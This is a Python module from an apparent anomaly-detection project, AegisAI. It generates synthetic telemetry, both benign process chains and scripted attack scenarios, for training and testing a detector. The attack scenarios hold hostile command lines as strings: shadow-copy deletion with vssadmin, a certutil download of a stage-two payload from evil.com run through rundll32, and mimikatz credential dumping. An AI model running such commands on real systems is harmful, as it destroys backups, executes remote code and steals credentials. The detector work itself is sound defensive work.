"""Synthetic telemetry event generator for AegisAI.

Produces realistic benign baseline data for Isolation Forest training and
scripted multi-stage attack scenarios for evaluation and testing.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

from src.models import Event

# Standard benign process chains
BENIGN_PROCESS_CHAINS = [
    "explorer.exe -> chrome.exe",
    "explorer.exe -> slack.exe",
    "explorer.exe -> code.exe -> node.exe",
    "explorer.exe -> outlook.exe",
    "svchost.exe -> backgroundTaskHost.exe",
    "explorer.exe -> excel.exe",
    "system -> services.exe -> svchost.exe",
    "explorer.exe -> teams.exe",
]

# Attack scenario definitions
ATTACK_SCENARIOS = {
    "ransomware": {
        "description": "Rapid file encryption activity with volume shadow copy deletion",
        "process_chains": [
            "explorer.exe -> word.exe -> powershell.exe -enc V1ND",
            "cmd.exe -> vssadmin.exe delete shadows /all /quiet",
            "powershell.exe -> ransom_locker.exe",
        ],
        "files_touched_range": (350, 1200),
        "cpu_range": (75.0, 99.0),
        "new_country": False,
    },
    "macro_malware": {
        "description": "Office macro spawning cmd and downloading remote payload",
        "process_chains": [
            "winword.exe -> cmd.exe -> powershell.exe -ExecutionPolicy Bypass",
            "powershell.exe -> certutil.exe -urlcache -split -f http://evil.com/stage2.bin",
            "cmd.exe -> rundll32.exe stage2.bin,Start",
        ],
        "files_touched_range": (40, 180),
        "cpu_range": (45.0, 80.0),
        "new_country": False,
    },
    "impossible_travel": {
        "description": "Anomalous geolocation login followed by credential dumping enumeration",
        "process_chains": [
            "winlogon.exe -> userinit.exe -> cmd.exe",
            "cmd.exe -> rundll32.exe keyiso.dll,DumpLsa",
            "powershell.exe -> mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"",
        ],
        "files_touched_range": (80, 250),
        "cpu_range": (30.0, 65.0),
        "new_country": True,
    },
}


def generate_baseline_events(count: int = 500, seed: int = 42) -> list[Event]:
    """Generate a sequence of benign baseline telemetry events for training.

    Args:
        count: Number of baseline events to synthesize.
        seed: Random seed for reproducible generation.

    Returns:
        List[Event]: Validated benign Event instances.
    """
    rng = random.Random(seed)
    users = ["alice.ops", "bob.dev", "charlie.analyst", "diana.fin", "svc_backup"]
    base_time = datetime.now(timezone.utc) - timedelta(hours=count / 10)
    events: list[Event] = []

    for i in range(count):
        event_time = base_time + timedelta(minutes=i * 2)
        event = Event(
            user=rng.choice(users),
            files_touched_per_min=rng.randint(1, 35),
            new_country=False,
            process_chain=rng.choice(BENIGN_PROCESS_CHAINS),
            cpu_percent=round(rng.uniform(2.0, 28.0), 2),
            timestamp=event_time,
        )
        events.append(event)

    return events


def generate_attack_scenario(scenario_key: str, user: str = "attacker.compromised", seed: int = 101) -> list[Event]:
    """Generate scripted attack sequence for a specific threat scenario.

    Args:
        scenario_key: One of 'ransomware', 'macro_malware', 'impossible_travel'.
        user: Targeted username or account.
        seed: Random seed for variation.

    Returns:
        List[Event]: Validated attack Event sequence.
    """
    if scenario_key not in ATTACK_SCENARIOS:
        raise ValueError(f"Unknown scenario: {scenario_key}. Available: {list(ATTACK_SCENARIOS.keys())}")

    config = ATTACK_SCENARIOS[scenario_key]
    rng = random.Random(seed)
    base_time = datetime.now(timezone.utc)
    events: list[Event] = []

    for idx, chain in enumerate(config["process_chains"]):
        f_min, f_max = config["files_touched_range"]
        c_min, c_max = config["cpu_range"]
        event = Event(
            user=user,
            files_touched_per_min=rng.randint(f_min, f_max),
            new_country=bool(config["new_country"]),
            process_chain=chain,
            cpu_percent=round(rng.uniform(c_min, c_max), 2),
            timestamp=base_time + timedelta(seconds=idx * 45),
        )
        events.append(event)

    return events


def generate_all_scenarios() -> dict[str, list[Event]]:
    """Generate all predefined attack sequences mapped by scenario name.

    Returns:
        Dict[str, List[Event]]: Dictionary mapping scenario names to event lists.
    """
    return {name: generate_attack_scenario(name, user=f"victim_{name}") for name in ATTACK_SCENARIOS}
